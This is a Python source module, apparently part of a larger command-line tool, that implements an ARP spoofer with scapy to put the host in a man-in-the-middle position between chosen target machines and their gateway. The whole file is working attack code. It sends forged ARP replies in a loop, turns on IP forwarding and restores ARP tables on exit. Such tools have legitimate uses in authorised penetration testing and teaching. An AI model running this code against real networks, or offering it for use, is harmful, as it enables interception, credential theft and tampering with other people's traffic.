"""
ARP spoofer for MITM positioning.

This module implements ARP spoofing to position the tool as man-in-the-middle.
It includes clean ARP table restoration on exit for graceful cleanup.
"""

import logging
import time

from scapy.all import ARP, getmacbyip, send

logger = logging.getLogger(__name__)


class ARPSpoofer:
    """
    ARP spoofer for MITM attacks.

    This class implements ARP spoofing to intercept traffic between targets
    and the gateway. It ensures clean restoration of ARP tables on exit.
    """

    def __init__(self, targets: set[str], gateway: str, interface: str, verbose: bool = False):
        """
        Initialize the ARP spoofer.

        Args:
            targets: Set of target IP addresses to spoof
            gateway: Gateway IP address
            interface: Network interface to use
            verbose: Enable verbose logging
        """
        self.targets = targets
        self.gateway = gateway
        self.interface = interface
        self.verbose = verbose

        self.gateway_mac: str | None = None
        self.target_macs: dict[str, str] = {}
        self._original_ip_forward: str | None = None

        self.running = False
        self.spoof_thread = None

    def get_mac(self, ip: str) -> str:
        """
        Get MAC address for an IP address.

        Args:
            ip: IP address

        Returns:
            MAC address as string

        Raises:
            Exception: If MAC address cannot be resolved
        """
        try:
            mac = getmacbyip(ip)
            if mac:
                return mac
            raise Exception(f"Could not resolve MAC for {ip}")
        except Exception as e:
            raise Exception(f"Error getting MAC for {ip}: {e}") from e

    def restore_arp(self) -> None:
        """Restore ARP tables to original state."""
        if self.verbose:
            print("Restoring ARP tables...")

        # Restore gateway ARP for all targets
        if self.gateway_mac:
            for target in self.targets:
                if target in self.target_macs:
                    try:
                        # Tell target the real gateway MAC
                        arp_response = ARP(
                            pdst=target,
                            hwdst=self.target_macs[target],
                            psrc=self.gateway,
                            hwsrc=self.gateway_mac,
                        )
                        send(arp_response, verbose=False)

                        if self.verbose:
                            print(f"Restored ARP for {target} -> {self.gateway}")
                    except Exception as e:
                        if self.verbose:
                            print(f"Error restoring ARP for {target}: {e}")

            # Restore gateway ARP for targets
            for target in self.targets:
                if target in self.target_macs:
                    try:
                        # Tell gateway the real target MAC
                        arp_response = ARP(
                            pdst=self.gateway,
                            hwdst=self.gateway_mac,
                            psrc=target,
                            hwsrc=self.target_macs[target],
                        )
                        send(arp_response, verbose=False)

                        if self.verbose:
                            print(f"Restored ARP for {self.gateway} -> {target}")
                    except Exception as e:
                        if self.verbose:
                            print(f"Error restoring ARP for gateway: {e}")

        if self.verbose:
            print("ARP tables restored")

    def spoof(self) -> None:
        """
        Perform ARP spoofing.

        This method sends periodic ARP packets to maintain the spoof.
        Should be called in a separate thread or loop.
        """
        target_retries: dict[str, int] = dict.fromkeys(self.targets, 0)
        max_retries = 3

        while self.running:
            for target in list(self.targets):
                if target_retries[target] >= max_retries:
                    continue  # Skip targets that have repeatedly failed

                try:
                    # Tell target we are the gateway
                    arp_target = ARP(pdst=target, psrc=self.gateway, hwdst=self.target_macs[target])
                    send(arp_target, verbose=False)

                    # Tell gateway we are the target
                    arp_gateway = ARP(pdst=self.gateway, psrc=target, hwdst=self.gateway_mac)
                    send(arp_gateway, verbose=False)

                    target_retries[target] = 0  # Reset on success

                    if self.verbose:
                        print(f"Sent ARP spoof for {target} <-> {self.gateway}")

                except Exception as e:
                    target_retries[target] += 1
                    logger.warning(f"Error spoofing {target}: {e} (Retry {target_retries[target]}/{max_retries})")
                    if target_retries[target] >= max_retries:
                        logger.error(f"Max retries reached for {target}. Dropping from spoof loop.")

            time.sleep(2)  # Send every 2 seconds

    def start(self) -> None:
        """Start ARP spoofing."""
        try:
            # Get gateway MAC
            self.gateway_mac = self.get_mac(self.gateway)
            if self.verbose:
                print(f"Gateway MAC: {self.gateway_mac}")

            # Get target MACs
            for target in self.targets:
                try:
                    mac = self.get_mac(target)
                    self.target_macs[target] = mac
                    if self.verbose:
                        print(f"Target {target} MAC: {mac}")
                except Exception as e:
                    print(f"Error getting MAC for {target}: {e}")
                    raise

            # Enable IP forwarding
            self._enable_ip_forwarding()

            # NOTE: signal handlers are NOT installed here.  The
            # ShutdownCoordinator in cli.py registers self.cleanup as a
            # callback and owns the SIGINT/SIGTERM handlers so that
            # iptables rules are also flushed on exit.

            self.running = True

            if self.verbose:
                print("ARP spoofing started...")
                print("Press Ctrl+C to stop and restore ARP tables")

            # Start spoofing loop
            self.spoof()

        except Exception as e:
            print(f"Error starting ARP spoofer: {e}")
            self.cleanup()
            raise

    def stop(self) -> None:
        """Stop ARP spoofing and restore ARP tables."""
        self.running = False
        self.restore_arp()

    def cleanup(self) -> None:
        """Cleanup resources."""
        self.stop()
        self._restore_ip_forwarding()

    def _enable_ip_forwarding(self) -> None:
        """Enable IP forwarding for MITM, saving the original state."""
        try:
            # Linux
            with open("/proc/sys/net/ipv4/ip_forward") as f:
                self._original_ip_forward = f.read().strip()

            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("1")
            if self.verbose:
                print("IP forwarding enabled")
        except Exception as e:
            if self.verbose:
                logger.warning(f"Could not enable IP forwarding: {e}")

    def _restore_ip_forwarding(self) -> None:
        """Restore IP forwarding to its original state."""
        if self._original_ip_forward is None:
            return  # We never successfully read it

        try:
            # Linux
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write(self._original_ip_forward)
            if self.verbose:
                print(f"IP forwarding restored to: {self._original_ip_forward}")
        except Exception as e:
            if self.verbose:
                logger.warning(f"Could not restore IP forwarding: {e}")

